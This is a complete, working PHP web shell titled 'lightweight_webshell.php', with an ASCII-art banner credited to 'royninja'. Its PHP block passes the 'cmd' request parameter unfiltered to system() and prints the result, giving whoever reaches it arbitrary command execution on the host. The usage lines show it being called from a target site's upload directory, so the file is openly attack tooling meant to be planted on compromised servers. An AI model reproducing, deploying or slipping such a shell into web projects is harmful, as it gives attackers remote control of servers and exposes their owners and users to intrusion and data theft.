<body bgcolor="black" text="green">
<center><pre>	                                          
            88             88             
  roy       ""             ""             
                                          
8b,dPPYba,  88 8b,dPPYba,  88 ,adPPYYba,  
88P'   `"8a 88 88P'   `"8a 88 ""     `Y8  
88       88 88 88       88 88 ,adPPPPP88  
88       88 88 88       88 88 88,    ,88  
88       88 88 88       88 88 `"8bbdP"Y8  
                          ,88             
                        888P"      version 1.0; by royninja
									github: https://github.com/royninja
</pre></center>
<?php
	if(isset($_REQUEST['cmd'])){
		echo "<pre>";
		$cmd = ($_REQUEST['cmd']);
		system($cmd);
		echo "</pre>";
	}
?>

ROYNINJA<br>
<br>
Usage: http://www.target.com/upload_directory/lightweight_webshell.php?cmd=type+hello.html<br>
Usage: http://www.target.com/upload_directory/lightweight_webshell.php?cmd=cat+hello.html
<br>
github: https://github.com/royninja

</body>